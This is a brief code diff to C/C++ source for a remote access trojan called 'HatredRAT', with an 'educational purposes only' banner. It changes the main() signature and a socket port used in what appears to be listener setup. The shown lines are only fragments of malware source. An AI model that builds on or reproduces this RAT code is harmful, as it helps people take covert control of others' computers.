@@ -78,7 +78,7 @@ void xml_print(xml::xml_node& node, int depth) {
     printf("%*s</%s>\n", depth, "", node.name.c_str());
 }
 
-int main() {
+int main(int argc, const char** argv) {
     DPRINTF("HatredRAT version 1.\n"
             "FOR EDUCATIONAL PURPOSES ONLY.\n");
 
@@ -324,7 +324,7 @@ int main() {
             .ai_protocol = IPPROTO_TCP
         };
 
-        getaddrinfo(NULL, "11154", &areq, &info);
+        getaddrinfo(NULL, "42069", &areq, &info);
 
         SOCKET sock = socket(info->ai_family, info->ai_socktype, info->ai_protocol);
 #endif
